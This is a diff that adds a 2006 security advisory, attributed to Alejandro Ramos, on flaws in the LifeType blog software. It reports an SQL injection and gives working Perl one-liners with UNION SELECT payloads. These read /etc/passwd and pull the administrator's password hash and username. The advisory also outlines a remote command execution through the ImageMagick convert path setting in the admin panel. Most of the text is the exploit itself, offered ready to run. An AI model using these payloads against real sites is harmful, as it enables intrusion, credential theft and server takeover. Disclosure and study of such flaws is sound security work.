@@ -1,0 +1,43 @@
+Author: Alejandro Ramos <aramosf *@* unsec.net>
+Date: 05/Jul/2006 15:48
+
+LifeType is prone to an SQL-injection vulnerability. This issue is due
+to a failure in the application to properly sanitize user-supplied
+input before using it in an SQL query.
+
+A successful exploit could allow an attacker to compromise the
+application, access or modify data, or exploit vulnerabilities in the
+underlying database implementation.
+
+its a poc:
+
+Get /etc/passwd:
+$ perl -MLWP::Simple -e "getprint
+'http://www.victim.org/index.php?op=Default&Date=200607\'%20UNION%20SELECT%201,load_file(\"/etc/passwd\"),1,1,1,1,1,1,1,1%20FROM%20lt_users%20WHERE%20id=\'1\'/*&blogId=1'"
+| perl -ne 's/\+/ /g; s/.*ViewArtic.*?=//g; s/&blog.*//g; print if
+   s/%(\w{2})/pack("H*","$1")/eg'
+
+
+Get md5 hash of admin:
+perl -MLWP::Simple -e "getprint
+'http://www.victim.org/index.php?op=Default&Date=200607\'%20UNION%20SELECT%201,password,1,1,1,1,1,1,1,1%20FROM%20lt_users%20WHERE%20id=\'1\'/*&blogId=1'"
+| perl -ne 'print "password: ".$1."\n" if /articleId=(\w*).*h3/'
+
+Get username of admin:
+perl -MLWP::Simple -e "getprint
+'http://localhost/index.php?op=Default&Date=200607\'%20UNION%20SELECT%201,user,1,1,1,1,1,1,1,1%20FROM%20lt_users%20WHERE%20id=\'1\'/*&blogId=1'"
+| perl -ne
+       'print "admin: ".$1."\n" if /articleId=(\w*).*h3/'
+
+
+LifeType is prone to an Remote Execution vulnerability. This issue is
+due to a failure in the application to properly sanitize user-supplied
+input before using it.
+
+A successful exploit could allow an attacker to compromise the
+application, access or modify data, or exploit vulnerabilities.
+
+POC:
+
+Change /usr/bin/convert in the admin panel to your command, change to
+imagemagik and upload a image
